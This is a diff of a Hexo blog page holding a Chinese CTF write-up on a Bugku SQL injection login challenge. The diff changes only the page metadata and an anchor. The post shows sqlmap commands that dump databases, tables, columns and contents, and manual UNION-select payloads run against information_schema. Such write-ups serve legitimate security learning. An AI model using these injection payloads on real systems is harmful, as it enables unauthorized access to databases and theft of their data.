@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>33-day | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的，因而这道题注入是post注入提交。那么就随便输入密码和用户然后用BP抓包。抓包后，右键c">
+  <meta name="description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="33-day">
 <meta property="og:url" content="http://yoursite.com/2019/09/15/33-day/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的，因而这道题注入是post注入提交。那么就随便输入密码和用户然后用BP抓包。抓包后，右键c">
+<meta property="og:description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-09-15T06:58:16.648Z">
+<meta property="og:updated_time" content="2019-10-17T00:39:54.181Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="33-day">
-<meta name="twitter:description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的，因而这道题注入是post注入提交。那么就随便输入密码和用户然后用BP抓包。抓包后，右键c">
+<meta name="twitter:description" content="SQL学习1.这是一个神奇的登陆框(http://123.206.87.240:9001/sql/)&amp;emsp;&amp;emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -174,7 +174,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="SQL学习"><a href="#SQL学习" class="headerlink" title="SQL学习"></a>SQL学习</h2><p>1.这是一个神奇的登陆框(<a href="http://123.206.87.240:9001/sql/" title="神奇的登陆框" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a>)<br>&emsp;&emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的，因而这道题注入是post注入提交。那么就随便输入密码和用户然后用BP抓包。抓包后，右键copy to file将它保存为一个1.txt存在D盘。直接用sqlmap跑。<br>首先猜测注入点应当是admin_name也就是提交的用户，构造payload:sqlmap.py -r “D:\1.txt” -p admin_name –dbs<br>-r是读文件，后面是保存的绝对路径 -p是跑的参数，也就是注入点是admin_name –dbs代表爆库<br>跑出来库名是bugkusql1<br>继续爆表，payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -p admin_name –tables<br>跑出来表名是flag1<br>继续爆列名：payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -p admin_name –columns<br>爆出来列名是flag1<br>接着是爆字段内容了：payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -C flag1 -p admin_name –dump<br>最后拿下了flag.<br>&emsp;&emsp;summary:唯一的收获是熟练使用了一下sqlmap吧，不过我对这道题的原理以及它所掌握的知识没有半点收获，flag的确跑出来了，我得去其他大佬那看一下这道题所掌握的sql知识。<br>接下来对这道题进行手工注入：（尝试掌握其SQL知识点）<br>首先在用户框输入0’无报错，输入0”发现报错：Try Again!<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“0”” and w_passwd=””‘ at line 1<br>说明的确可以注入，并且是字符型注入，接下来猜测字段长度构造payload:0” order by 2,无错误回显 猜测3，发现报错，说明字段长度为2.<br>接下来开始爆库：payload:0” union select database(),2#得到数据库名为bugkusql1<br>接下来是获取表名：payload：0” union select table_name,2 from information_schema.tables where table_schema=’bugkusql1’ #<br>获取表名为flag1.<br>接下来获取字段名：payload:0” union select column_name,2 from information_schema.columns where table_schema=’bugkusql1’ #<br>获取字段名也为flag1.<br>最后获取字段内容，构造payload:0” union select flag1 from flag1 #.拿下flag.<br>&emsp;&emsp;在手工注入后发现这道题还是蛮简单的，属于最基础的sql注入，没有过滤任何的select,or,and之类的，直接利用爆库爆表语句就能获取到数据。就当一次最基本的sql注入的熟练吧。</p>
+        <h2 id="SQL学习"><a href="#SQL学习" class="headerlink" title="SQL学习"></a>SQL学习</h2><p>1.这是一个神奇的登陆框(<a href="http://123.206.87.240:9001/sql/" title="神奇的登陆框" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a>)<br>&emsp;&emsp;提示了是sql的题目，但我对如何注入没有半点思路，首先f12看一下。源代码部分注释了一个UserName和Password这里不知道是干什么的，可以看到登陆的表单框是由post方式提交的<a id="more"></a>，因而这道题注入是post注入提交。那么就随便输入密码和用户然后用BP抓包。抓包后，右键copy to file将它保存为一个1.txt存在D盘。直接用sqlmap跑。<br>首先猜测注入点应当是admin_name也就是提交的用户，构造payload:sqlmap.py -r “D:\1.txt” -p admin_name –dbs<br>-r是读文件，后面是保存的绝对路径 -p是跑的参数，也就是注入点是admin_name –dbs代表爆库<br>跑出来库名是bugkusql1<br>继续爆表，payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -p admin_name –tables<br>跑出来表名是flag1<br>继续爆列名：payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -p admin_name –columns<br>爆出来列名是flag1<br>接着是爆字段内容了：payload:sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -C flag1 -p admin_name –dump<br>最后拿下了flag.<br>&emsp;&emsp;summary:唯一的收获是熟练使用了一下sqlmap吧，不过我对这道题的原理以及它所掌握的知识没有半点收获，flag的确跑出来了，我得去其他大佬那看一下这道题所掌握的sql知识。<br>接下来对这道题进行手工注入：（尝试掌握其SQL知识点）<br>首先在用户框输入0’无报错，输入0”发现报错：Try Again!<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“0”” and w_passwd=””‘ at line 1<br>说明的确可以注入，并且是字符型注入，接下来猜测字段长度构造payload:0” order by 2,无错误回显 猜测3，发现报错，说明字段长度为2.<br>接下来开始爆库：payload:0” union select database(),2#得到数据库名为bugkusql1<br>接下来是获取表名：payload：0” union select table_name,2 from information_schema.tables where table_schema=’bugkusql1’ #<br>获取表名为flag1.<br>接下来获取字段名：payload:0” union select column_name,2 from information_schema.columns where table_schema=’bugkusql1’ #<br>获取字段名也为flag1.<br>最后获取字段内容，构造payload:0” union select flag1 from flag1 #.拿下flag.<br>&emsp;&emsp;在手工注入后发现这道题还是蛮简单的，属于最基础的sql注入，没有过滤任何的select,or,and之类的，直接利用爆库爆表语句就能获取到数据。就当一次最基本的sql注入的熟练吧。</p>
 
       
 
